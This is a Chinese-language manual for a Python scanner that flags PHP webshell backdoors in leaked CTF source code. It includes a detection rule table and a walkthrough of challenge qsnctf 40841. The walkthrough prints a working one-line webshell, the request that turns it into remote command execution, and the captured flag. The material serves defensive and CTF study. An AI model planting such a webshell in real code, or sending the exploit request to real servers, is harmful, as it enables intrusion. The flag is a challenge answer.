# 🛠 工具说明书 · PHP 后门扫描器（backdoor_scan.py）

> 版本：v1.0 ｜ 日期：2026-08-18 ｜ 语言：纯 Python 标准库，无需安装任何依赖

## 1. 这是什么

给**源码泄露题**用的后门扫描器：把一份 PHP 源码目录（或 zip 包）丢给它，它自动挑出**藏着后门 / 一句话木马的文件**，按危险度从高到低排好给你。

典型场景：题目首页给你一个 `www.zip` 下载 → 解压出几百上千个 PHP 文件 → 只有 1 个藏着后门 → 人工翻不现实，交给它扫。

## 2. 为什么需要它（背景）

| 问题 | 说明 |
|---|---|
| 人工不现实 | 40841 题解压出 **1002 个**随机哈希命名的 PHP，几乎全是噪声代码，只有 1 个藏后门 |
| D盾 等商用工具会漏 | 它们靠"已知马的特征库"匹配；这种 `array_filter + base64_decode(回调)` 的**免杀变体**不在库里，直接漏报（实测） |
| 本工具的差异 | 按**结构模式**扫：不认马的名字，认马的"骨架"——只要出现"用户输入 + 危险回调"的组合就点名，所以变体也能抓 |

## 3. 快速开始（3 种用法）

| 方式 | 怎么做 | 适合场景 |
|---|---|---|
| **双击** | 双击 `backdoor_scan.py` → 黑窗口出现 `Path:` → 输入路径 → 回车 → 看完结果按回车关闭 | 最常用 |
| **拖拽** | 把**文件夹**或 **zip** 直接拖到 .py 图标上松手 → 自动开窗扫描 → 按回车关闭 | 不想打字时 |
| **命令行** | `python backdoor_scan.py <路径> [--top N]` | 以后学了终端再用 |

> 第一次双击如果弹出的是**编辑器/代码**而不是黑窗口：右键 → 打开方式 → 选择其他应用 → 选 Python（或 Python Launcher）→ 勾选"始终使用此应用"→ 确定。改一次即可。

## 4. 支持扫什么

- ✅ 文件夹（会递归扫所有子目录）
- ✅ zip 压缩包（自动解压）
- ✅ 扩展名：`.php` `.phtml` `.php3` `.php5`
- ❌ 不扫：其他语言文件、加密 zip

## 5. 输出怎么看

```text
[*] 扫描完成: 共 1001 个 PHP 文件, 1 个命中可疑规则

=== [1] 危险度 21  1de9d9a55a824f4f8b6f37af76596baa.php ===
    (10) 变量函数回调(array_filter/array_map+base64_decode) @L29  | $e=$_REQUEST['e'];$arr=array($_POST['POST'],);array_filter($arr,base64_decode($e));
    ( 8) base64_decode 接变量 @L29  | ...
    ( 3) 超全局输入 $_REQUEST/$_GET/$_POST @L29  | ...
```

| 字段 | 含义 |
|---|---|
| `共 N 个文件, M 个命中` | M = 嫌疑文件数。M≥1 时**只看列表第一个**（危险度最高） |
| `危险度 21` | 该文件命中的规则权重之和（10+8+3）。权重越高越危险 |
| `@L29` | 后门代码在第 29 行，直接去看那一行 |
| `(10)/(8)/(3)` | 每条命中规则对应的权重 |

**判断标准**
- 命中 ≥1 → 第一个文件就是攻击目标，配合其代码做利用（发请求 → RCE → 读 flag）
- **0 命中** → 这题不是"源码藏后门"套路，换思路：git 泄露（`.git/`）、备份文件（`.bak`）、配置文件泄露、目录扫描等

## 6. 内置规则表

| 权重 | 规则 | 抓什么（示例） |
|---|---|---|
| 10 | 动态回调 | `array_filter/map/walk(..., base64_decode($e))` ← 40841 同款 |
| 10 | create_function | `create_function('', $_GET[x])` |
| 10 | preg_replace /e | 老 PHP 的代码注入修饰符 |
| 9 | eval / assert | `eval($_POST[x])` 经典一句话 |
| 8 | base64_decode 接变量 | 编码参数动态解码 |
| 7 | 变量函数调用 | `$f($_GET[x])` |
| 6 | system/exec 系列 | `system` `exec` `shell_exec` `passthru` `popen` `proc_open` |
| 6 | 文件包含变量 | `include($x)` `require($x)` |
| 5 | 反引号命令执行 | `` `$cmd` `` |
| 5 | 读文件到变量 | `file_get_contents($x)` `readfile` |
| 4 | 反序列化 | `unserialize($x)` |
| 3 | 超全局输入 | `$_REQUEST` `$_GET` `$_POST` `$_COOKIE`（单独出现也留意） |
| 标记 | 混淆入口 | `gzinflate` `str_rot13` 超长 base64 / hex 串（不占分，仅提示） |

## 7. 常见问题（FAQ）

| 问题 | 解决办法 |
|---|---|
| 双击弹出代码编辑器 | 按第 3 节底部方法改文件关联 |
| 窗口一闪而过 | 本工具内置"等回车再关"，正常不会闪。若仍闪，多半是杀毒软件拦截，加白名单 |
| 输出乱码 | 只是显示问题，不影响扫描结果 |
| 扫出 0 命中 | 换套路（见第 5 节），或把源码发我一起看 |
| 想加新规则 | 用记事本打开 .py，找到 `SCAN_RULES = [ ... ]`，照格式加一行 `(名称, 正则, 权重)` 即可 |

## 8. 实战复盘（qsnctf 40841）

1. 首页下载 `www.zip` → 解压 1002 个 PHP
2. `backdoor_scan.py www.zip` → 唯一点名 `1de9d9a55a824f4f8b6f37af76596baa.php`（危险度 21）
3. 后门长这样（L29）：
   ```php
   $e=$_REQUEST['e'];$arr=array($_POST['POST'],);array_filter($arr,base64_decode($e));
   ```
   即：把 `e` 参数 base64 解码成函数名（`c3lzdGVt` = `system`），再让 `array_filter` 把 `POST` 参数当参数调用它 → `system(命令)` = RCE
4. 利用：`GET ?e=c3lzdGVt` + `POST POST=cat /flag` → `flag{c468b0f92441432f970aff939afde53f}`
